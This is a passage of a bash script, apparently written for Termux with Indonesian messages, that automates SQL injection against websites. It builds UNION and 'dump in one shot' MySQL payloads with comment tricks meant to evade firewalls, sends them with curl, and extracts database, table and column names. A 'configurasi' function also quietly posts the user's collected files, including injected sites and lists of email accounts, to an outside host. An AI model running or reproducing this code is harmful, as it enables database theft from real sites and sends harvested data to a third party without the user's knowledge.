#!/data/data/com.termux

^&]*(?=&lt;li)|Forbidden|forbidden|Not Acceptable|Internal Server Error' | cut -d "<" -f2 | sed 's/li>//g' |  tr -d ',' | tr -d '\0' | sed 's/\r$//')                                      echo -e "${O}Get db_name: ${N}\033[2m$dk"               fi
    fi
       else                                                        echo -e "${N}[${R}INFO${N}] ${R}gagal ambil info server"
    fi                                                         if echo "$dbnya" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
       echo -e "${O}\033[2mWAFF Blocked: ${R}`echo "$dbnya" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
       continue                                                fi                                                         echo "$dbnya" > .db
    ff=$(cat .db)
            if [[ "$ff" = "" ]]                                        then
              echo -e "${R}\033[2mFAILED mengambil nama db${N}"                                                                   else
              dbdir=$(echo "$info" | grep -Po 'Database: [[:alnum:][:punct:]]*' | cut -d " " -f2)
              if [[ -z $dbdir ]];then
                 db_dir="null"                                           fi
              if [[ -z $db_na ]];then
                 db_na="null"
              fi
              echo -e "${N}retrived_db: ${G}mysql@$dbdir${N}~ "
              cat .db | sort -u | uniq -i | sed "s/^/~ /g"
              if [[ "$boot_empas" = "y" ]];then
                for db_ro in $(cat .db | sort -u | uniq -i)
                do                                                            if [[ "$corect" = "y" ]];then
                      db_root=$(grep -nH -m 1 -R "$db_ro" .db | head -1 | cut -d ":" -f3)
                   else
                      db_root="$db_ro"
                   fi
                   if  [[ "$db_ro" = "" ]]                                    then                                                          echo -e "${N}\033[2mDatabase yg dimasukan kosong langsung dios${N}"
                      dump_sqli="n"                                              hex="database/**8**/()"                                    dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                      dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios
                   fi
                   if echo "$db_ro" | grep -Po "dio|DIOS|dios|Dios|DIos|dios" >/dev/null
                   then
                      echo -e "${N}\033[2mDump in One shoot${N}"                                                                            dump_sqli="n"
                      hex="database/**8**/()"                                    dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                                         dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"                                       dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                            dios
                   fi                                                         if cat .db | grep -Po "$db_ro" >/dev/null                                                                             then
                      db_na=$(cat .db | grep -Po "$db_root" | sort -u | uniq -i)                                                            if [[ -z $dbdir ]];then                                       db_dir="null"
                      fi                                                         if [[ -z $db_na ]];then
                         db_na="null"                                            fi
                      echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na${N}~\n"
                      dump_sqli="y"                                              echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                      asx="$db_na"
                      hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
                      hex=$(echo "0x$hex")
                      dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
                      dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                      dios                                                    fi
                done
                break                                                else
              echo -e "${R}~${N} dios"
              echo -en "Dump Db: ${O}"
              read db_ro
              if [[ "$corect" = "y" ]];then                                 db_root=$(grep -nH -m 1 -R "$db_ro" .db | head -1 | cut -d ":" -f3)                                                else
                 db_root="$db_ro"                                        fi
              if  [[ "$db_ro" = "" ]]                                    then
                 echo -e "${N}\033[2mDatabase yg dimasukan kosong langsung dios${N}"
                 dump_sqli="n"                                              hex="database/**8**/()"                                    dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                                         dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"                                       dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                            dios                                                    fi                                                         if echo "$db_ro" | grep -Po "dio|DIOS|dios|Dios|DIos|dios" >/dev/null                                                 then                                                          echo -e "${N}\033[2mDump in One shoot${N}"                 dump_sqli="n"                                              hex="database/**8**/()"                                    dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                                         dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"                                       dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
                 dios                                                    fi                                                         if cat .db | grep -Po "$db_ro" >/dev/null                  then                                                          db_na=$(cat .db | grep -Po "$db_root" | sort -u | uniq -i)                                                            if [[ -z $dbdir ]];then                                       db_dir="null"                                           fi                                                         if [[ -z $db_na ]];then                                       db_na="null"                                            fi
                 echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na${N}~\n"                                                            dump_sqli="y"                                              echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"                                                      asx="$db_na"
                 hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)                                        hex=$(echo "0x$hex")
                 dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                                         dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"                                       dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                            dios                                                    fi                                                         break                                                    fi;fi                                                    fi                                                 done;endspin                                                 else                                                         if [[ "$by" = "$w3" ]];then                                   us2="${by}concat${w3a}/**8**/(0x6b65646a6177336e2656657273696f6e3a,${by}version${w3a}/**8**/(),0x2655736572207365727665723a20,${by}user${w3a}/**8**/(),0x2644617461626173653a20,${by}database${w3a}/**8**/(),0x3c6b6564)"
      else                                                          us2="concat${by}/**8**/(0x6b65646a6177336e2656657273696f6e3a,version${by}/**8**/(),0x2655736572207365727665723a20,user${by}/**8**/(),0x2644617461626173653a20,database${by}/**8**/(),0x3c6b6564)"
      fi                                                         us1="concat(0x6b65646a6177336e2656657273696f6e3a,/*!50000@@version*/,0x2655736572207365727665723a20,user(),0x2644617461626173653a20,database(),0x3c6b6564)"                   echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka                                                 if cat .angka >/dev/null                                   then
      if echo $ngecur | grep -Po "where clause" >/dev/null       then                                                         df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')                                                  ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")                                         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka                   cat .angka |  sed 's/kedjaw3n//g' > .angka               fi                                                       if [[ "$based64" = "y" ]]                                  then                                                          its=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')                                                       else                                                          its=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
    fi                                                         if [[ "$i" = `cat .angka | sort -r` ]];then
       in=$(cat .angka | tail -1)                              else                                                          if cat .angka | wc -l | grep 3 >/dev/null
       then
         in=$(cat .angka | sort | tail -2 | head -1)              else                                                         in=$(cat .angka | sort | tail -3 | head -1)              fi                                                         _in=$(cat .angka | sort -r | sed '1 s/^.*$//' | sed "/^$/d" | head -1)
    fi                                                        for us in $us2 $us1                                        do                                                          if [[ "$based64" = "y" ]]
    then                                                          st=$(echo "`cut -d "=" -f1 <<< $site`=" )                  if [[ "$corona" = "y" ]];then                                base44=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")                                                             else                                                         if [[ "$in" = "$i" ]];then                                    base44=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")                                                          else                                                          base44=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")                                                        fi                                                       fi                                                         bs9=$(echo "null$union$base44")                            bs57=$(echo "$bs9" | tr -d "+" | base64 -i)                base94=$(echo "$st$bs57" | tr -d "\n")                     if [[ "$debug" = "y" ]];then                                  echo -e " $base44 \n $bs9 \n $bs57" #test               fi                                                         info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base94" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d' | tr -d '\0' | sed 's/\r$//')                                                      else #php                                                     if [[ "$html" = "y" ]]                                     then                                                          if [[ "$corona" = "y" ]];then                                 db=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")
          else                                                          if [[ "$in" = "$i" ]];then                                    db=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")                                                              else                                                          db=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
             fi
          fi
          dk=$(echo -e "$param1$union$db$param2")
       else
          if [[ "$corona" = "y" ]];then
             db=$(sed "s#${in}#$us#g" <<< $its | sed "s/,,/,/g")                                                                else                                                          if [[ "$in" = "$i" ]];then
                if [[ "$debug" = "y" ]];then
                   echo "aokaokwakoakok"
                fi
                db=$(sed "s#,${in}#,$us#g" <<< $its | sed "s/,,/,/g")
             else
                db=$(sed "s#,${in},#,$us,#g" <<< $its | sed "s/,,/,/g")
             fi                                                      fi
          dk=$(echo -e "$site$union$db")
       fi
       if [[ "$debug" = "y" ]];then
                   echo -e "its: $its\n in : $in\n dk:$dk"                 fi                                                if [[ "$postd" = "y" ]]                                    then                                                          dk=$(echo -e "$union$db")                                  info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$dk" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d' | tr -d '\0' | sed 's/\r$//')                        else                                                          info=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$dk" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d' | tr -d '\0' | sed 's/\r$//')                                                          fi
       if echo "$info" | grep -Po "Database" >/dev/null;then
          echo "$info" > output/$dir/info.txt                        break
       else                                                          echo -e "${O}\033[2mWAFF Blocked: ${R}Forbiden${N}\n${O}get info bypassing"
       fi
    fi                                                       done
       else                                                        echo -e "${N}[${R}INFO${N}] ${R}gagal ambil info server"
    fi
   fi
}
configurasi() {
        echo -en "${N}\033[2mLoading your support in prosess..."                                                              tanggal=$(date)                                            bit1=$(cat injected.txt 2>/dev/null | sort -u | uniq -i | sed "s/&/\&/g" )
        bit2=$(echo -e "Date: $tanggal\n\n$bit1\n" | sort -u | uniq -i | sed "s/&/%26/g" )                                    curl -s "agressivcode.6te.net/config/edit.php?p=injected-$pengguna" -X POST -d "newd=${bit2}" >/dev/null              echo -n "."                                                bit3=$(cat gmail.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )                           bit4=$(echo -e "Date: $tanggal\n\n$bit3\n" | sort -u | uniq -i | sed "s/&/%26/g" )
        curl -s "agressivcode.6te.net/config/edit.php?p=gmail-$pengguna" -X POST -d "newd=${bit4}" >/dev/null
        echo -n "."
        bit5=$(cat yahoo.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )                           bit6=$(echo -e "Date: $tanggal\n\n$bit5\n" | sort -u | uniq -i | sed "s/&/%26/g" )                                    curl -s "agressivcode.6te.net/config/edit.php?p=yahoo-$pengguna" -X POST -d "newd=${bit6}" >/dev/null                 echo -n "."                                                bit7=$(cat hotmail.txt 2>/dev/null | sort -u | uniq -i)                                                               bit8=$(echo -e "Date: $tanggal\n\n$bit7\n" | sort -u | uniq -i | sed "s/&/%26/g" )
        echo -en "\033[2m\ntunggu sebentar..."                     curl -s "agressivcode.6te.net/config/edit.php?p=hotmail-$pengguna" -X POST -d "newd=${bit8}" >/dev/null               echo -n "."                                                bit9=$(cat aol.txt 2>/dev/null | sort -u | uniq -i | sort -u | uniq -i | sed "s/&/\&/g" )
        bit10=$(echo -e "Date: $tanggal\n\n$bit9\n" | sort -u | uniq -i | sed "s/&/%26/g" )
        curl -s "agressivcode.6te.net/config/edit.php?p=aol-$pengguna" -X POST -d "newd=${bit10}" >/dev/null                  echo -n "."                                                bit11=$(cat vuln.txt 2>/dev/null | sort -u | uniq -i)
        bit12=$(echo -e "Date: $tanggal\n\n$bit11\n" | sort -u | uniq -i | sed "s/&/%26/g" )                                  curl -s "agressivcode.6te.net/config/edit.php?p=vuln-$pengguna" -X POST -d "newd=${bit12}" >/dev/null                 echo -n "."                                                echo -en "\033[2m\nsuccess!!\n"
}                                                          dios() {
  #echo -e "$by \n$waff"
  if cat .angka >/dev/null                                   then
    if echo $ngecur | grep -Po "Unknown column 'kedjaw3n[0-9]*'" >/dev/null
    then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
        cat .angka |  sed 's/kedjaw3n//g' > .angka
    fi
  if [[ "$based64" = "y" ]]
  then
     i2=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')
  else                                                          i2=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
  fi
  if [[ "$i" = `cat .angka | sort -r` ]];then                     in=$(cat .angka | tail -1)
  else                                                         if cat .angka | wc -l | grep 3 >/dev/null
    then                                                         in=$(cat .angka | sort | tail -2 | head -1)              else
      in=$(cat .angka | sort | tail -3 | head -1)
    fi                                                            _in=$(cat .angka | sort -r | sed '1 s/^.*$//' | sed "/^$/d" | head -1)
  fi
  if [[ "$lcvs" = "y" ]]
  then
    if echo "$union" | grep -Po "%27|'" >/dev/null;then
       stringna="y"                                               union=$(echo -e "$union" | sed "s/%27//g" | sed "s/'//g")
       site="$site%27"
    fi                                                         unionpo=$(echo -e "$union" | cut -d "+" -f2)               union=$(echo -e "+$unionpo")                               if [[ "$dump_sqli" = "y" ]];then                               asx="$db_na"                                               hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)                                        if echo "$db_ro" | grep -Po "dios" >/dev/null;then            hex="database/**8**/()"                                 else
           hex=$(echo "0x$hex")                                    fi                                                          dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"                                         dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
         dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
      fi
         dios6="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=database())and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
      if [[ "$waff" = "on" ]];then
      if [[ "$by"  = "$w3" ]];then
         dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
      else
         dios8="(select(@x)${by}/*!50000from*/${by}(${by}/*!50000select*/${by}(@x:=0x00),(select(0)${by}/*!From*/${by}(${by}/*!50000information_schema.columns*/${by})${by}/*!50000where*/${by}(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/${by}(@x,0x3c6c693e,/*!50000table_name${by}*/,0x3a3a,/*!50000column_name${by}*/))))x)"
         dios9="(select(@x)${by}from${by}(${by}select${by}(@x:=0x00),(select(0)${by}From${by}(${by}information_schema.columns${by})${by}where${by}(table_schema=$hex)and(0x00)in(@x:=coNcat${by}/**8**/(@x,0x3c6c693e,${by}table_name${by},0x3a3a,${by}column_name${by}))))x)"
      fi
    fi
      for dio in $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 u                                                    do                                                           if [[ "$dio" = "u" ]]                                      then
            echo -e "$N[${R}\033[7;31mCRITICAL${N}]$O F A I L E D try dump dios manual$N"
            break
          fi                                                         dor="@x"
          if [[ "$based64" = "y" ]]                                  then                                                          st=$(echo "`cut -d "=" -f1 <<< $site`=" )                  if [[ "$corona" = "y" ]];then                                 base44=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")                                                            else                                                          if [[ "$in" = "$i" ]];then
                   base44=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")
                else                                                          base44=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")
                fi
             fi                                                         bs90=$(echo "null%20and%20mod(9,9)%20div@x:=$dio%20$union$base44" | tr -d "\n")                                       bs570=$(echo "$bs90" | sed "s,+,%20,g" | base64 -i)
             base990=$(echo "$st$bs570" | tr -d "\n")
             echo -e "${O}Dios: ${N}\033[2m$base990"
             if [[ "$debug" = "y" ]];then
                echo -e "kontol $st$bs570\n$bs570\n$base44\n$bs990\n$st" #test
             fi                                                         if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base990" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table
             then
                if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then                      echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"                              continue                                                fi
                ff=$(cat .table)
                if [[ "$ff" = "" ]]
                  then
                    echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED mencoba dengan dios lain${N}"
                else
                    dump
                    break
                fi
             else
                echo -e "$N[${R}\033[7;31mCRITICAL${N}]$O F A I L E D try dump dios manual$N"
             fi
         else
             if [[ "$corona" = "y" ]];then
                dk=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")                                                                else
                if [[ "$in" = "$i" ]];then                                    dk=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")                                                             else
                   dk=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")                                                         fi;fi
             if [[ "$html" = "y" ]]                                     then
                if [[ "$stringna" = "y" ]]                                 then                                                          ls=$(echo -e "$param1%27+and+mod(9,9)+div@x:=$dio$union$dk$param2")                                                else
                   ls=$(echo -e "$param1+and+mod(9,9)+div@x:=$dio$union$dk$param2")                                                   fi
                echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
             else                                                          if [[ "$postd" = "y" ]]
                then
                   ls=$(echo -e "and+mod(9,9)+div@x:=$dio$union$dk")
                   echo -e "DIOS : $postnya=null$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt                                                         else                                                          ls=$(echo -e "$site+and+mod(9,9)+div@x:=$dio$union$dk")
                   echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt                                                                      fi                                                      fi                                                         if [[ "$debug" = "y" ]];then                                  echo -e "DIOS : $in $i2 $dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' #test               fi                                                         echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
         fi                                                         if [[ "$postd" = "y" ]]
         then
           ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -LX POST "$site" --data "$postnya=null$ls" | tr -d '\0' | sed 's/\r$//')                                         else                                                         ngeles=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$ls" | tr -d '\0' | sed 's/\r$//')
         fi
         echo -e "${O}Dios: $N\033[2m$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'                               if echo "$ngeles" | grep -a -Po "(?<=<li>)[\.\:\_\@\[:alnum:]*::\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\.\:\_\[:alnum:]*]*<|<li>[^:]*::[_/-/./[:alnum:]]*<li>|<li>[^:]*::[_/-/./[:alnum:]]*<|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//' > .table                                                 then                                                          if cat .table | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
               echo -e "${O}\033[2mWAFF Blocked: ${R}`cat .table 2>/dev/null | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
               continue
            fi
            ff=$(cat .table)                                           if [[ "$ff" = "" ]]
            then
              echo -e "${R}\033[2mFAILED mencoba dengan dios lain${N}"                                                            else
              dump                                                       break
            fi                                                      fi                                                       done                                                #====Dump dios biasa==========================================================================================
    else
      dios6="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=database())and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"                                 if [[ "$waf" = "on" ]];then                                if [[ "$by"  = "$w3" ]];then                                  dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
      else
         dios8="(select(@x)${by}/*!50000from*/${by}(${by}/*!50000select*/${by}(@x:=0x00),(select(0)${by}/*!From*/${by}(${by}/*!50000information_schema.columns*/${by})${by}/*!50000where*/${by}(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/${by}(@x,0x3c6c693e,/*!50000table_name${by}*/,0x3a3a,/*!50000column_name${by}*/))))x)"                                   dios9="(select(@x)${by}from${by}(${by}select${by}(@x:=0x00),(select(0)${by}From${by}(${by}information_schema.columns${by})${by}where${by}(table_schema=$hex)and(0x00)in(@x:=coNcat${by}/**8**/(@x,0x3c6c693e,${by}table_name${by},0x3a3a,${by}column_name${by}))))x)"                               fi                                                        fi                                                         if [[ "$local" = "y" ]];then                                  asw1="y"
     fi
        for dor in $asw1 $dios1 $dios2 $dios3 $dios4 $dios5 $dios6 $dios8 $dios9 y
        do                                                           if [[ "$dor" = "y" ]]                                      then                                                         lcvs="y"                                                   echo -e "${O}\033[2mLocal variabel dios method${N}"                                                                   dios
            break
          fi                                                         if [[ "$based64" = "y" ]]
          then                                                          st=$(echo "`cut -d "=" -f1 <<< $site`=" )                 if [[ "$corona" = "y" ]];then
                base44=$(sed "s#${in}#$dor#g" <<< $i2 | sed "s/,,/,/g")                                                            else                                                          if [[ "$in" = "$i" ]];then
                   base44=$(sed "s#,${in}#,$dor#g" <<< $i2 | sed "s/,,/,/g")                                                          else                                                          base44=$(sed "s#,${in},#,$dor,#g" <<< $i2 | sed "s/,,/,/g")                                                        fi                                                      fi
             bs9=$(echo "null$union$base44" | tr -d "\n")               bs57=$(echo "$bs9" | sed "s,+,%20,g" | base64 -i)
             base99=$(echo "$st$bs57" | tr -d "\n")                     echo -e "${O}Dios: ${N}\033[2m$base99"
             if [[ "$debug" = "y" ]];then
                echo -e "\n$bs57\n$base44\n$bs9\n$st" #test
